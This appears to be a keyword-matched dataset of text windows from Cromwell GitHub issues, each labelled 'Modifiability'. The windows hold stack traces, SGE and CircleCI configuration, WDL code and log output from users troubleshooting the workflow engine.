Modifiability,ply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendLifecycleActor$class.performActionThenRespond(BackendLifecycleActor.scala:44);,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:2447,Config,ConfigInitializationActor,2447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['Config'],['ConfigInitializationActor']
Modifiability,"pool-7-th 4751; 470 pool-7-th 2381; 470 pool-10-t 4751; 470 pool-10-t 2381; 282 G1 4751; 282 G1 2381; 188 blaze-tic 4751; 188 blaze-tic 2381; 94 VM 4751; 94 VM 2381; 94 java 4751; 94 java 2381; 94 db-9 4751; 94 db-9 2381; 94 db-8 4751; 94 db-8 2381; 94 db-7 4751; 94 db-7 2381; 94 db-6 4751; 94 db-6 2381; 94 db-5 4751; 94 db-5 2381; 94 db 4751; 94 db-4 4751; 94 db-4 2381; 94 db-3 4751; 94 db-3 2381; 94 db-2 4751; 94 db 2381; 94 db-2 2381; 94 db-20 4751; 94 db-20 2381; 94 db-19 4751; 94 db-19 2381; 94 db-18 4751; 94 db-18 2381; 94 db-17 4751; 94 db-17 2381; 94 db-16 4751; 94 db-16 2381; 94 db-15 4751; 94 db-15 2381; 94 db-1 4751 ...; ```. this is my java command; ```{shell}; java -Xms10M -Xmx125M -Dconfig.file=SGE.conf -jar cromwell-86.jar run xxx.wdl --inputs xxx.json; ```. SGE.conf file:; ```; # Documentation:; # https://cromwell.readthedocs.io/en/stable/backends/SGE. backend {; default = SGE. providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? sge_queue = ""xxx""; String? sge_project = ""xxx""; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l num_proc="" + cpu + "",virtual_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; -binding ${""linear:"" + cpu} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }. call-caching {; enabled = true; invalidate-bad",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7571:1530,Config,ConfigBackendLifecycleActorFactory,1530,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7571,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"pp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfig",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:1998,Config,ConfigDocumentParser,1998,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigDocumentParser']
Modifiability,"pping auto-registration; 2021-09-27 13:47:55,753 WARN - Skipping auto-registration; 2021-09-27 13:47:55,833 INFO - Running with database db.url = jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true; Skipping auto-registration; 2021-09-27 13:47:56,493 WARN - Skipping auto-registration; 2021-09-27 13:47:57,524 INFO - Reference disks feature for PAPIv2 backend is not configured.; 2021-09-27 13:47:58,075 INFO - Slf4jLogger started; 2021-09-27 13:47:58,470 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-69bdc1a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2021-09-27 13:47:58,845 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - Metadata summary refreshing every 1 second.; 2021-09-27 13:47:58,865 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - No metadata archiver defined in config; 2021-09-27 13:47:58,865 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - No metadata deleter defined in config; 2021-09-27 13:47:58,926 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2021-09-27 13:47:58,929 cromwell-system-akka.dispatchers.service-dispatcher-14 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2021-09-27 13:47:58,935 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2021-09-27 13:47:58,937 cromwell-system-akka.actor.default-dispatcher-7 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2021-09-27 13:47:59,274 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - JobExecutionTokenDispenser - Distribution rate: 20 per 10 seconds.; 2021-09-27 13:47:59,340 cro",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:6218,config,config,6218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['config'],['config']
Modifiability,"pply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:51); 	at com.typesafe.config.Conf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:2105,Config,ConfigDocumentParser,2105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigDocumentParser']
Modifiability,"ppy to answer specific questions that you might have, feel free to post them on here, and no worries about the busy-ness! I hope the :fire: calms down, at least it has been sort of not so great for CA! If it helps, I'll leave you some notes here:. - adding this circle testing doesn't interfere with your current testing; - adding the build and deploy of the docker container here is a better strategy than having travis handle everything because the two can run at the same time.; - environment variables, given docker credentials, are set on the circleci project backend (once and forgotten about). This is mostly just DOCKER for pushing to docker hub.; - The yaml uses [anchors](https://discuss.circleci.com/t/using-defaults-syntax-in-config-yaml-aka-yaml-anchors/16168) in the configuration like functions, and to pipe in defaults. I name them according to what they do (e.g., `dockersave`. Some quick learnings:. Let's say we create a defaults section that looks like this, to set some shared environment variables, working directory, docker container, anything we want really:. ```; defaults: &defaults; docker:; - image: docker:18.01.0-ce-git; working_directory: /tmp/src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:1202,variab,variables,1202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,2,['variab'],['variables']
Modifiability,"ps://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl, exceeded import_max_depth; circular imports?; None; ```. ## Backends; * Terra (kind of); * Mac OS on womtool 76; * Ubuntu on womtool 56. I say ""kind of"" for Terra since I can't see the error message -- if you try to upload this workflow to the Broad Methods Repo, a 500 error will result, and I've a hunch that's the result of the stack overflow. ## Example workflow; ```; version 1.0. import ""https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl""; # note: that workflow also has the line import ""https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl""; # I meant to actually import ""https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segfault.wdl"". workflow Segment_Scatter {; 	input {; 		# if you input 10 files and n_segments = 5, each segment gets 2 files; 		Array[File] input_files; 		Int n_segments; 	}. 	call segfault.segfault {; 		input:; 			inputs = input_files,; 			n_segments = n_segments; 	}. 	scatter(segment in segfault.segments) {; 		call echo_files {; 			input:; 				files_to_echo = segment; 		}; 	}; }. task echo_files {; 	input {; 		Array[File] files_to_echo; 	}. 	command <<<; 	python3 << CODE; 	files = [""~{sep='"",""' files_to_echo}""]; 	for file in files:; 		print(file); 	CODE; 	>>>. 	runtime {; 		docker: ""ashedpotatoes/sranwrp:1.1.0""; 		memory: ""4 GB""; 	}; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6964:4019,config,configuration,4019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6964,1,['config'],['configuration']
Modifiability,"ptible_attempts; }. Int modeled_segments_tumor_disk = ceil(size(DenoiseReadCountsTumor.denoised_copy_ratios, ""GB"")) + ceil(size(ModelSegmentsTumor.modeled_segments, ""GB"")) + disk_pad; call CallModeledSegments as CallModeledSegmentsTumor {; input:; entity_id = CollectCountsTumor.entity_id,; modeled_segments_input_file = ModelSegmentsTumor.modeled_segments,; load_copy_ratio = load_copy_ratio,; load_allele_fraction = load_allele_fraction,; normal_minor_allele_fraction_threshold = normal_minor_allele_fraction_threshold,; copy_ratio_peak_min_weight = copy_ratio_peak_min_weight,; min_fraction_of_points_in_normal_allele_fraction_region = min_fraction_of_points_in_normal_allele_fraction_region,; gatk4_jar_override = gatk4_jar_override,; gatk_docker = gatk_docker,; mem_gb = mem_gb_for_call_modeled_segments,; disk_space_gb = modeled_segments_tumor_disk,; preemptible_attempts = preemptible_attempts; }. # The F=files from other tasks are small enough to just combine into one disk variable and pass to the tumor plotting tasks; Int plot_tumor_disk = ref_size + ceil(size(DenoiseReadCountsTumor.standardized_copy_ratios, ""GB"")) + ceil(size(DenoiseReadCountsTumor.denoised_copy_ratios, ""GB"")) + ceil(size(ModelSegmentsTumor.het_allelic_counts, ""GB"")) + ceil(size(ModelSegmentsTumor.modeled_segments, ""GB"")) + disk_pad; call PlotDenoisedCopyRatios as PlotDenoisedCopyRatiosTumor {; input:; entity_id = CollectCountsTumor.entity_id,; standardized_copy_ratios = DenoiseReadCountsTumor.standardized_copy_ratios,; denoised_copy_ratios = DenoiseReadCountsTumor.denoised_copy_ratios,; ref_fasta_dict = ref_fasta_dict,; minimum_contig_length = minimum_contig_length,; gatk4_jar_override = gatk4_jar_override,; gatk_docker = gatk_docker,; mem_gb = mem_gb_for_plotting,; disk_space_gb = plot_tumor_disk,; preemptible_attempts = preemptible_attempts; }. call PlotModeledSegments as PlotModeledSegmentsTumor {; input:; entity_id = CollectCountsTumor.entity_id,; denoised_copy_ratios = DenoiseReadCountsTumor.deno",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669:9395,variab,variable,9395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669,1,['variab'],['variable']
Modifiability,"r and fix crashes in real time. Cromwell is using an deprecated version of the Sentry java bindings for logback called `raven-logback`. The current bindings are called `sentry-logback`. Additionally, the cromwell docs currently mention that sentry can be setup via the ""configuration value"" `sentry.dsn`. https://github.com/broadinstitute/cromwell/blob/b8d3d2fd4a583d3e46394efb104005c12cdf182d/docs/Logging.md#L48. https://github.com/broadinstitute/cromwell/blob/b8d3d2fd4a583d3e46394efb104005c12cdf182d/docs/Configuring.md#L345-L355. This is not correct as `raven-logback` nor its underlying library `raven` use Typesafe Config. Instead for `raven` the value must be set as a system property, or alternatively as a different environment variable. However the latest `sentry` library (and transitively `sentry-logback`) do allow code configuration via `Sentry.init`. **A/C:**; - Replace `raven-logback` dependency with `sentry-logback`; - ~Allow setting a `cromwell.sentry.*` stanza with Cromwell specific sentry configuration. Alternative namespaces could be `sentry.*` or `system.sentry.*`, but both namespaces may collide with other library/application configurations in the future!~; - ~Wire the `cromwell.sentry.*` HOCON fields into `Sentry.init`~; - ~Default the sentry DSN in `reference.conf` to a noop -OR- ensure that when an error is generated that the latest version of `sentry` does not output a ""suitable DSN"" warning~; - Update docs for Cromwell+Sentry in both `docs/Logging.md` and `docs/Configuring.md`; - ~Update `CHANGELOG.md` with configuration changes for Cromwell+Sentry~ Edit: Not necessary if still using sentry style configuration. **Links:**; - http://cromwell.readthedocs.io/en/develop/Configuring/#workflow-log-directory; - http://cromwell.readthedocs.io/en/develop/Logging/#workflow-logs; - (video) [Episode #108 - Tracking Errors with Sentry](https://www.youtube.com/watch?v=n5hWUD2CXd8); - https://sentry.io/for/java/; - https://docs.sentry.io/clients/java/; - https://d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3657:1719,config,configuration,1719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3657,1,['config'],['configuration']
Modifiability,"r jars/cromwell-34.jar run hello_world/hello_world_0.wdl; ```; Output:; ```; [2018-08-30 17:53:11,17] [info] Running with database db.url = jdbc:hsqldb:mem:4fbaa426-09e6-4c70-9a1a-15469c4d77a0;shutdown=false;hsqldb.tx=mvcc; [2018-08-30 17:53:19,24] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-08-30 17:53:19,26] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-08-30 17:53:19,39] [info] Running with database db.url = jdbc:hsqldb:mem:146c8707-d56e-4f58-a2de-df327f328109;shutdown=false;hsqldb.tx=mvcc; [2018-08-30 17:53:20,13] [info] Slf4jLogger started; [2018-08-30 17:53:20,68] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-232861f"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-08-30 17:53:20,92] [info] Metadata summary refreshing every 2 seconds.; [2018-08-30 17:53:21,02] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-08-30 17:53:21,03] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-08-30 17:53:21,03] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-08-30 17:53:21,89] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-08-30 17:53:21,95] [info] SingleWorkflowRunnerActor: Version 34; [2018-08-30 17:53:21,97] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-08-30 17:53:22,05] [info] Unspecified type (Unspecified version) workflow 4dbd7d1c-e7e8-4f83-9750-5c638d1567bc submitted; [2018-08-30 17:53:22,16] [info] SingleWorkflowRunnerActor: Workflow submitted 4dbd7d1c-e7e8-4f83-9750-5c638d1567bc; [2018-08-30 17:53:22,16] [info] 1 new workflows fetched; [2018-08-30 17:53:22,16] [info] WorkflowManagerActor Starting workflow 4dbd7d1c-e7e8-4f83-9750-5c638d1567bc; [2018-08-30 17:53:22,17] [info] WorkflowMana",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4062:1023,config,configured,1023,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4062,1,['config'],['configured']
Modifiability,"r ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 submitted; 2018-06-07 12:16:52,348 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - 1 new workflows fetched; 2018-06-07 12:16:52,349 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Starting workflow UUID(dd0b1399-ebb6-4d9b-89ea-7da193994220); 2018-06-07 12:16:52,353 cromwell-system-akka.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96997,config,configured,96997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,r rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWork,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4610,Config,ConfigInitializationActor,4610,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"r your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Default application.json not found in classpath in precompiled jar on github (affecting multiple releases tested version 86 and 85). ; Tested to not be affected version 79/56. Main error below. Should be an easy fix. . ```; Exception in thread ""main"" com.typesafe.config.ConfigException$IO: application: application.conf: java.io.IOException: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1073,config,config,1073,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['config']
Modifiability,"r, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both 